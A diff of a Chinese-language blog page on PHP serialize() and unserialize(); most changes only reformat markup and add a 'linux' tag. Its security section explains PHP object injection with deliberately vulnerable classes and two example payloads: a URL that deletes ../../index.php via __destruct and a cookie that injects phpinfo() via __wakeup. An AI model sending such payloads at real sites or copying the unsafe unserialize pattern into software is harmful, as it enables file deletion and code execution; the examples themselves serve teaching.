@@ -80,6 +80,10 @@
                     </li>
                     
                     <li>
+                        <a href="/categories/linux">linux</a>
+                    </li>
+                    
+                    <li>
                         <a href="/categories/php">php</a>
                     </li>
                     
@@ -183,22 +187,17 @@
                         <h2>TOC</h2>
                         </header>
                         <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#序列化">序列化</a>
-<ul>
-<li><a href="#1-序列化不同的类型">1. 序列化不同的类型</a></li>
-<li><a href="#2-反序列化的安全问题">2. 反序列化的安全问题</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#序列化">序列化</a>
+      <ul>
+        <li><a href="#1-序列化不同的类型">1. 序列化不同的类型</a></li>
+        <li><a href="#2-反序列化的安全问题">2. 反序列化的安全问题</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
         		
-        		
-
-<h2 id="序列化">序列化</h2>
-
+        		<h2 id="序列化">序列化</h2>
 <table>
 <thead>
 <tr>
@@ -206,54 +205,36 @@
 <th>详情</th>
 </tr>
 </thead>
-
 <tbody>
 <tr>
 <td>value</td>
-<td>要序列化的值，<code>serialize()</code>接受所有的类型，除了资源类型。你甚至可以序列化包含自身引用的数组。包含循环引用的数组和对象也是可以处理的。任何其他的引用都会丢失。当序列化的时候，PHP会在序列化之前首先调用<code>__sleep()</code>方法。这允许对象在序列化的最后一分钟进行数据的清理工作。同样，在调用<code>unserialize()</code>方法的时候，会首先调用<code>__wakeup()</code>方法。对象的私有属性前添加类型；受保护的属性前面会有&rdquo;*&ldquo;。这些预先准备好的值两边都有空字节。</td>
+<td>要序列化的值，<code>serialize()</code>接受所有的类型，除了资源类型。你甚至可以序列化包含自身引用的数组。包含循环引用的数组和对象也是可以处理的。任何其他的引用都会丢失。当序列化的时候，PHP会在序列化之前首先调用<code>__sleep()</code>方法。这允许对象在序列化的最后一分钟进行数据的清理工作。同样，在调用<code>unserialize()</code>方法的时候，会首先调用<code>__wakeup()</code>方法。对象的私有属性前添加类型；受保护的属性前面会有&rdquo;*&quot;。这些预先准备好的值两边都有空字节。</td>
 </tr>
 </tbody>
 </table>
-
 <h3 id="1-序列化不同的类型">1. 序列化不同的类型</h3>
-
 <p>生成一个值的可存储格式。</p>
-
 <p>这在存储或传输PHP值而不丢失值的类型和结构的时候很有用。</p>
-
 <p>想要把序列化的结果返回PHP的值，可以使用<code>unserialize()</code>方法。</p>
-
 <p><strong>序列化string</strong></p>
-
-<pre><code class="language-php">$string = &quot;Hello world&quot;;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$string = &#34;Hello world&#34;;
 echo serialize($string);
 // 输出:
-// s:11:&quot;Hello world&quot;;
-</code></pre>
-
-<p><strong>序列化double</strong></p>
-
-<pre><code class="language-php">$double = 1.5;
+// s:11:&#34;Hello world&#34;;
+</code></pre></div><p><strong>序列化double</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$double = 1.5;
 echo serialize($double);
 // 输出:
 // d:1.5;
-</code></pre>
-
-<p><strong>序列化float</strong></p>
-
+</code></pre></div><p><strong>序列化float</strong></p>
 <p>float和double的序列化效果相同。</p>
-
 <p><strong>序列化integer</strong></p>
-
-<pre><code class="language-php">$integer = 65;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$integer = 65;
 echo serialize($integer);
 // 输出:
 // i:65;
-</code></pre>
-
-<p><strong>序列化boolean</strong></p>
-
-<pre><code class="language-php">$boolean = true;
+</code></pre></div><p><strong>序列化boolean</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$boolean = true;
 echo serialize($boolean);
 // Output:
 // b:1;
@@ -262,118 +243,83 @@ $boolean = false;
 echo serialize($boolean);
 // Output:
 // b:0;
-</code></pre>
-
-<p><strong>序列化NULL</strong></p>
-
-<pre><code class="language-php">$null = null;
+</code></pre></div><p><strong>序列化NULL</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$null = null;
 echo serialize($null);
 // Output:
 // N;
-</code></pre>
-
-<p><strong>序列化array</strong></p>
-
-<pre><code class="language-php">$array = array(
+</code></pre></div><p><strong>序列化array</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$array = array(
     25,
-    'String',
-    'Array'=&gt; ['Multi Dimension','Array'],
-    'boolean'=&gt; true,
-    'Object'=&gt;$obj, // $obj from above Example null,
+    &#39;String&#39;,
+    &#39;Array&#39;=&gt; [&#39;Multi Dimension&#39;,&#39;Array&#39;],
+    &#39;boolean&#39;=&gt; true,
+    &#39;Object&#39;=&gt;$obj, // $obj from above Example null,
     3.445
 );
 // 下面将会出错
-// $array['function'] = function() { return &quot;function&quot;; };
+// $array[&#39;function&#39;] = function() { return &#34;function&#34;; };
 echo serialize($array);
 // 输出:
-// a:7:{i:0;i:25;i:1;s:6:&quot;String&quot;;s:5:&quot;Array&quot;;a:2:{i:0;s:15:&quot;Multi Dimension&quot;;i:1;s:5:&quot;Array&quot;;}s:7:&quot;boolean&quot;;b:1;s:6:&quot;Object&quot;;O:3:&quot;abc&quot;:1:{s:1:&quot;i&quot;;i:1;}i:2;N;i:3;d:3.4449999999999998;}
-</code></pre>
-
-<p><strong>序列化Object</strong></p>
-
+// a:7:{i:0;i:25;i:1;s:6:&#34;String&#34;;s:5:&#34;Array&#34;;a:2:{i:0;s:15:&#34;Multi Dimension&#34;;i:1;s:5:&#34;Array&#34;;}s:7:&#34;boolean&#34;;b:1;s:6:&#34;Object&#34;;O:3:&#34;abc&#34;:1:{s:1:&#34;i&#34;;i:1;}i:2;N;i:3;d:3.4449999999999998;}
+</code></pre></div><p><strong>序列化Object</strong></p>
 <p>你可以序列化对象。</p>
-
 <p>在序列化对象之前，PHP将会试着调用<code>__sleep()</code>方法。这允许对象在序列化的最后一分钟进行数据的清理工作。同样，在调用<code>unserialize()</code>方法的时候，会首先调用<code>__wakeup()</code>方法。</p>
-
-<pre><code class="language-php">class abc {
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">class abc {
     var $i = 1;
     function foo() {
-        return 'hello world';
+        return &#39;hello world&#39;;
     }
 }
 
 $object = new abc();
 echo serialize($object);
 // 输出:
-// O:3:&quot;abc&quot;:1:{s:1:&quot;i&quot;;i:1;}
-</code></pre>
-
-<p><strong>注意Closure是不能序列化的</strong></p>
-
+// O:3:&#34;abc&#34;:1:{s:1:&#34;i&#34;;i:1;}
+</code></pre></div><p><strong>注意Closure是不能序列化的</strong></p>
 <pre><code>$function = function () { echo 'Hello World!'; }; 
 $function(); // prints &quot;hello!&quot;
 
 $serializedResult = serialize($function); 
 // Fatal error: Uncaught exception 'Exception' with message 'Serialization of 'Closure' is not allowed'
-</code></pre>
-
-<h3 id="2-反序列化的安全问题">2. 反序列化的安全问题</h3>
-
+</code></pre><h3 id="2-反序列化的安全问题">2. 反序列化的安全问题</h3>
 <p>使用<code>unserialize()</code>反序列化用户输入的数据可能会有危险。</p>
-
 <p>php.net的警告</p>
-
 <blockquote>
 <p>警告：不要将任何不信任用户输入的数据传递给<code>unserialize()</code>方法。由于对象实例化和自动加载，非序列化可能导致加载和执行代码，恶意用户可能会利用此漏洞。如果需要将序列化数据传递给用户，请使用安全的标准数据交换格式，如json（通过<code>json_decode()</code>和<code>json_encode()</code>）。</p>
 </blockquote>
-
 <p><strong>可能的攻击</strong></p>
-
 <ul>
 <li>PHP对象注入</li>
 </ul>
-
 <p><strong>PHP对象注入</strong></p>
-
 <p>PHP对象注入是一个应用级漏洞，根据上下文，攻击者可以执行不同的攻击：代码注入，SQL注入，路径遍历和应用拒绝服务。当用户提供的输入在传递给unserialize（）php函数之前未正确清理时，就会出现此漏洞。由于php允许对象序列化，攻击者可以将特殊序列化字符串传递给易受攻击的<code>unserialize()</code>调用，从而在应用程序范围内注入任意php对象。</p>
-
 <p>为了成功利用PHP对象注入漏洞，必须满足两个条件：</p>
-
 <ul>
 <li>应用程序必须具有一个类，该类实现可用于执行恶意攻击或启动“pop链”的PHP魔术方法（如<code>__wakeup()</code>或<code>__destruct()</code>）.</li>
 <li>当调用易受攻击的<code>unserialize()</code>时，必须声明攻击期间使用的所有类，否则，此类类必须支持对象自动加载。</li>
 </ul>
-
 <p><strong>例子1- PHP路径遍历攻击</strong></p>
-
 <p>下面的例子显示利用<code>__destruct()</code>攻击：</p>
-
-<pre><code class="language-php">class Example1 {
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">class Example1 {
     public $cache_file;
     function __construct() {
       // some PHP code...
     }
     function __destruct() {
-        $file = &quot;/var/www/cache/tmp/{$this-&gt;cache_file}&quot;;
+        $file = &#34;/var/www/cache/tmp/{$this-&gt;cache_file}&#34;;
         if (file_exists($file)) {
             @unlink($file);
         }
     }
 }
 // some PHP code...
-$user_data = unserialize($_GET['data']); // some PHP code...
-</code></pre>
-
-<p>在本例中，攻击者可以通过路径遍历攻击删除任意文件，例如请求以下URL:</p>
-
-<pre><code class="language-php">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}
-</code></pre>
-
-<p><strong>例子2-代码注入攻击</strong></p>
-
+$user_data = unserialize($_GET[&#39;data&#39;]); // some PHP code...
+</code></pre></div><p>在本例中，攻击者可以通过路径遍历攻击删除任意文件，例如请求以下URL:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">http://testsite.com/vuln.php?data=O:8:&#34;Example1&#34;:1{s:10:&#34;cache_file&#34;;s:15:&#34;../../index.php&#34;;}
+</code></pre></div><p><strong>例子2-代码注入攻击</strong></p>
 <p>下面的例子显示使用<code>__wakeup</code>攻击：</p>
-
-<pre><code class="language-php">class Example2 {
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">class Example2 {
     private $hook;
     function __construct() {
       // some PHP code...
@@ -385,27 +331,19 @@ $user_data = unserialize($_GET['data']); // some PHP code...
     }
 }
 // some PHP code...
-$user_data = unserialize($_COOKIE['data']); // some PHP code...
-</code></pre>
-
-<p>在本例中，攻击者可以通过如下方式发送HTTP请求来执行代码注入攻击：</p>
-
+$user_data = unserialize($_COOKIE[&#39;data&#39;]); // some PHP code...
+</code></pre></div><p>在本例中，攻击者可以通过如下方式发送HTTP请求来执行代码注入攻击：</p>
 <pre><code>ET /vuln.php HTTP/1.0
 Host: testsite.com
 Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29% 3B%22%3B%7D
 Connection: close
-</code></pre>
-
-<p>当COOKIE中的data由下面的代码生成时：</p>
-
-<pre><code class="language-php">class Example2 {
-    private $hook = &quot;phpinfo();&quot;; 
+</code></pre><p>当COOKIE中的data由下面的代码生成时：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">class Example2 {
+    private $hook = &#34;phpinfo();&#34;; 
 }
 
 print urlencode(serialize(new Example2));
-</code></pre>
-
-<p>参考：<a href="https://goalkicker.com/PHPBook">PHP® Notes for Professionals book</a></p>
+</code></pre></div><p>参考：<a href="https://goalkicker.com/PHPBook">PHP® Notes for Professionals book</a></p>
 
         
                 
@@ -477,6 +415,12 @@ print urlencode(serialize(new Example2));
                         
                         <a href="/tags/java" title="java">
                         java
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/linux" title="linux">
+                        linux
                         </a>
                         
                         
